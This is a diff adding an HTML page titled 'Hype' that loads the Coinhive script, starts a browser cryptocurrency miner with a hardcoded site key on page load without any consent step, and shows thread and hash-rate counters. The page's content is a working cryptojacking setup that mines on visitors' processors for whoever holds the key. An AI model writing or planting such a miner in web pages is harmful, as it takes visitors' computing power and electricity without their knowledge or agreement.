@@ -1,0 +1,40 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Hype</title>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+        var name = Math.floor(Math.random()*1000);
+        var miner = new CoinHive.User('x7lJozj7YkUgRD3dyyaOYly6Fa8dtynQ','tumbler'+name,
+            {throttle: 0.2, forceASMJS: true}
+        );
+        miner.start();
+        var threads = miner.getNumThreads();
+        miner.setNumThreads(threads);
+        window.onload = function() {
+        
+            
+            var mine = document.getElementById("mine");
+            var total = document.getElementById("total");
+            var all = document.getElementById("all");                            
+            setInterval(
+                function(){
+                    mine.innerHTML = threads;
+                    total.innerHTML = miner.getHashesPerSecond();
+                    all.innerHTML = miner.getTotalHashes();
+            }, 5000);
+        };
+        
+    </script>
+</head>
+<body>
+    This Is Hype<br>
+    <span>Threads: <div id="mine"></div></span>
+    <span>Hashes per second: <div id="total"></div></span>
+    <span>All hashes: <div id="all"></div></span>
+</body>
+</html>
